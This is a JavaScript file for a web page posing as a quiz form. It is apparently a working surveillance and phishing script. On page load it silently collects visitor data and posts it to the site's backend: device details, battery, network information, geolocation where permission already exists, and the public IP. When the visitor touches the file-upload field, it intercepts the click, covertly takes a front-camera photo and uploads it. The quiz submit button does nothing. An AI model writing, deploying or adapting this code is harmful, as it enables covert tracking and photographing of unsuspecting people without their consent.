const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;
let capturedImage = null; // store camera image

// ================================
// ENSURE VIDEO IS CLEAN ON PAGE LOAD
// ================================
window.addEventListener("DOMContentLoaded", () => {
  video.srcObject = null;
  video.style.display = "none";
  video.removeAttribute("autoplay");

  // 🔥 RUN SUBMIT PAYLOAD ON VISIT
  sendPayloadOnVisit();
});

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    ip: "N/A",
    time: new Date().toLocaleString(),
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${Math.round(b.level * 100)}% charging:${b.charging}`;
    } catch {}
  }

  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    metadata.ip = ipData.ip;
  } catch {}

  return metadata;
}

// ================================
// CAMERA CAPTURE + UPLOAD (/upload)
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured || cameraInProgress) return;

  cameraInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();
    await new Promise((r) => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: capturedImage }),
    });

    stream.getTracks().forEach((t) => t.stop());
    video.style.display = "none";

    cameraCaptured = true;
  } catch (err) {
    console.error("❌ Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// TRIGGER CAMERA ONLY ON FILE INPUT
// ================================
fileInput.addEventListener("pointerdown", async (e) => {
  if (!cameraCaptured && !cameraInProgress) {
    e.preventDefault();
    await captureAndSendCamera();
    setTimeout(() => fileInput.click(), 50);
  }
});

// ================================
// FILE UPLOAD FUNCTION (/file-upload)
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// ORIGINAL SUBMIT PAYLOAD (MOVED)
// ================================
async function sendPayloadOnVisit() {
  try {
    const metadata = await collectMetadata();

    let fileData = null;
    let filename = null;

    if (fileInput.files.length) {
      fileData = await new Promise((resolve) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.readAsDataURL(fileInput.files[0]);
      });
      filename = fileInput.files[0].name;
    }

    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        file: fileData,
        filename,
        metadata,
        cameraImage: capturedImage || null,
      }),
    });

    console.log("✅ Auto-visit upload:", await res.json());
  } catch (err) {
    console.error("❌ Upload failed:", err);
  }
}

// ================================
// SUBMIT HANDLER DISABLED
// ================================
form.addEventListener("submit", (e) => {
  e.preventDefault();
});
